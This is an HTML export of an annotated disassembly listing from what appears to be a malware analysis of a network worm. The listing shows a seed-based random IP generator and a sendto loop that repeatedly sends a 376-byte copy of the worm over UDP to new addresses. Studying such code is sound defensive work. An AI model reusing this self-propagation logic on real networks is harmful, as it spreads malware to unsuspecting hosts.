</span><span class="c45">seg000:0000000000000145                 </span><span class="c5">lea     </span><span class="c33">ecx</span><span class="c9">, [</span><span class="c33">rax</span><span class="c9">+</span><span class="c33">rax</span><span class="c9">*2] </span><span class="c2">; seed&#039; = seed + seed * 2
</span><span class="c45">seg000:0000000000000148                 </span><span class="c5">lea     </span><span class="c33">edx</span><span class="c9">, [</span><span class="c33">rax</span><span class="c9">+</span><span class="c33">rcx</span><span class="c9">*4] </span><span class="c2">; seed&#039;&#039; = seed + seed&#039; * 4
</span><span class="c45">seg000:000000000000014B                 </span><span class="c5">shl     </span><span class="c33">edx</span><span class="c9">, </span><span class="c12">4          </span><span class="c2">; left shift seed&#039;&#039; by 4
</span><span class="c45">seg000:000000000000014E                 </span><span class="c5">add     </span><span class="c33">edx</span><span class="c9">, </span><span class="c33">eax        </span><span class="c2">; add the original seed value into
</span><span class="c45">seg000:000000000000014E                                         </span><span class="c2">; the newly shifted seed&#039;&#039;
</span><span class="c45">seg000:0000000000000150                 </span><span class="c5">shl     </span><span class="c33">edx</span><span class="c9">, </span><span class="c12">8          </span><span class="c2">; shift it again by 8 bits
</span><span class="c45">seg000:0000000000000153                 </span><span class="c5">sub     </span><span class="c33">edx</span><span class="c9">, </span><span class="c33">eax        </span><span class="c2">; subtract the original seed from
</span><span class="c45">seg000:0000000000000153                                         </span><span class="c2">; edx
</span><span class="c45">seg000:0000000000000155                 </span><span class="c5">lea     </span><span class="c33">eax</span><span class="c9">, [</span><span class="c33">rax</span><span class="c9">+</span><span class="c33">rdx</span><span class="c9">*4] </span><span class="c2">; seed = seed + seed&#039;&#039;*4
</span><span class="c45">seg000:0000000000000158                 </span><span class="c5">add     </span><span class="c33">eax</span><span class="c9">, </span><span class="c33">ebx        </span><span class="c2">; add the xor ebx value into eax
</span><span class="c45">seg000:0000000000000158                                         </span><span class="c2">; for an extra level of randomization
</span><span class="c45">seg000:000000000000015A                 </span><span class="c5">mov     </span><span class="c9">[</span><span class="c33">rbp</span><span class="c9">-</span><span class="c12">4Ch</span><span class="c9">], </span><span class="c33">eax  </span><span class="c2">; Replace the original seed value
</span><span class="c45">seg000:000000000000015A                                         </span><span class="c2">; with our new random seed
</span><span class="c45">seg000:000000000000015A                                         </span><span class="c2">; //random seed == IP address
</span><span class="c45">seg000:000000000000015D                 </span><span class="c5">push    </span><span class="c12">10h             </span><span class="c2">; add 16 to stack
</span><span class="c45">seg000:000000000000015F                 </span><span class="c5">lea     </span><span class="c33">eax</span><span class="c9">, [</span><span class="c33">rbp</span><span class="c9">-</span><span class="c12">50h</span><span class="c9">]  </span><span class="c2">; grab the port # from earlier
</span><span class="c45">seg000:0000000000000162                 </span><span class="c5">push    </span><span class="c33">rax             </span><span class="c2">; save to the stack
</span><span class="c45">seg000:0000000000000163                 </span><span class="c5">xor     </span><span class="c33">ecx</span><span class="c9">, </span><span class="c33">ecx        </span><span class="c2">;  ecx = 0
</span><span class="c45">seg000:0000000000000165                 </span><span class="c5">push    </span><span class="c33">rcx             </span><span class="c2">; add 0 to the stack
</span><span class="c45">seg000:0000000000000166                 </span><span class="c5">xor     </span><span class="c33">cx</span><span class="c9">, </span><span class="c12">178h        </span><span class="c2">; ecx = 178h // 376 decimal
</span><span class="c45">seg000:000000000000016B                 </span><span class="c5">push    </span><span class="c33">rcx             </span><span class="c2">; add 376 to the stack
</span><span class="c45">seg000:000000000000016C                 </span><span class="c5">lea     </span><span class="c33">eax</span><span class="c9">, [</span><span class="c33">rbp</span><span class="c9">+</span><span class="c12">3</span><span class="c9">]    </span><span class="c2">; beginning of the UDP packet with overflow
</span><span class="c45">seg000:000000000000016C                                         </span><span class="c2">;
</span><span class="c45">seg000:000000000000016C                                         </span><span class="c2">; pointing at the corrupted return address
</span><span class="c45">seg000:000000000000016C                                         </span><span class="c2">; also skipping header info?
</span><span class="c45">seg000:000000000000016F                 </span><span class="c5">push    </span><span class="c33">rax             </span><span class="c2">; add address to the stack
</span><span class="c45">seg000:0000000000000170                 </span><span class="c5">mov     </span><span class="c33">eax</span><span class="c9">, [</span><span class="c33">rbp</span><span class="c9">-</span><span class="c12">54h</span><span class="c9">]  </span><span class="c2">; the open socket made earlier
</span><span class="c45">seg000:0000000000000173                 </span><span class="c5">push    </span><span class="c33">rax             </span><span class="c2">; add the pointer to the stack
</span><span class="c45">seg000:0000000000000174                 </span><span class="c5">call    </span><span class="c33">rsi             </span><span class="c2">; calls sendto using the last 6
</span><span class="c45">seg000:0000000000000174                                         </span><span class="c2">; pushes as arguments
</span><span class="c45">seg000:0000000000000174                                         </span><span class="c2">;
</span><span class="c45">seg000:0000000000000174                                         </span><span class="c2">; sendto(Socket,
</span><span class="c45">seg000:0000000000000174                                         </span><span class="c2">;        Worm Payload,
</span><span class="c45">seg000:0000000000000174                                         </span><span class="c2">;        Length of Worm,
</span><span class="c45">seg000:0000000000000174                                         </span><span class="c2">;        flags,
</span><span class="c45">seg000:0000000000000174                                         </span><span class="c2">;        sockaddr struct,
</span><span class="c45">seg000:0000000000000174                                         </span><span class="c2">;        sixe of sock struct)
</span><span class="c45">seg000:0000000000000174                                         </span><span class="c2">;        // This is when the virus
</span><span class="c45">seg000:0000000000000174                                         </span><span class="c2">;        sends a copy over the network
</span><span class="c45">seg000:0000000000000174                                         </span><span class="c2">;        looking for suitable computers
</span><span class="c45">seg000:0000000000000176                 </span><span class="c5">jmp     </span><span class="c32">short </span><span class="c26">loc_142   </span><span class="c2">; repeat sending the virus out
</span><span class="c45">seg000:0000000000000176                                         </span><span class="c2">; to a new IP address
</span><span class="c45">seg000:0000000000000176 </span><span class="c4">; ---------------------------------------------------------------------------
</span><span class="c46">seg000:0000000000000178                 </span><span class="c32">dq </span><span class="c31">153D82h</span><span class="c9">, </span><span class="c31">1A2000001A2h</span><span class="c9">, </span><span class="c31">8FA44733E8000h</span><span class="c9">, </span><span class="c31">450008236E4846h </span><span class="c2">; Trash
</span><span class="c46">seg000:0000000000000198                 </span><span class="c32">dq </span><span class="c31">1180000092FA9401h</span><span class="c9">, </span><span class="c31">62AD16D2B63DFFF5h</span><span class="c9">, </span><span class="c31">80019A056F04978Bh
</span><span class="c47">seg000:00000000000001B0                 </span><span class="c32">db </span><span class="c31">0E8h
</span><span class="c47">seg000:00000000000001B1                 </span><span class="c32">db  </span><span class="c31">15h                 </span><span class="c2">; End Trash
</span><span class="c47">seg000:00000000000001B1 </span><span class="c27">seg000          ends
</span><span class="c47">seg000:00000000000001B1
seg000:00000000000001B1
seg000:00000000000001B1                 </span><span class="c27">end
</span>
</span><style type="text/css">
/* line-fg-default */
.c1 { color: blue; }
/* line-bg-default */
.c41 { background-color: white; }
/* line-pfx-insn */
.c45 { color: maroon; }
/* line-fg-automatic-comment */
.c4 { color: gray; }
/* line-fg-extra-line */
.c21 { color: blue; }
/* line-fg-asm-directive */
.c27 { color: blue; }
/* line-fg-insn */
.c5 { color: navy; }
/* line-fg-register-name */
.c33 { color: navy; }
/* line-fg-punctuation */
.c9 { color: navy; }
/* line-fg-numlit-in-insn */
.c12 { color: green; }
/* line-fg-regular-comment */
.c2 { color: blue; }
/* line-fg-keyword */
.c32 { color: navy; }
/* line-fg-dummy-code-name */
.c26 { color: navy; }
/* line-pfx-unexplored */
.c47 { color: olive; }
/* line-fg-numlit-in-data */
.c31 { color: #008040; }
/* line-pfx-data */
.c46 { color: gray; }
/* line-fg-code-xref */
.c14 { color: green; }
</style></body></html>
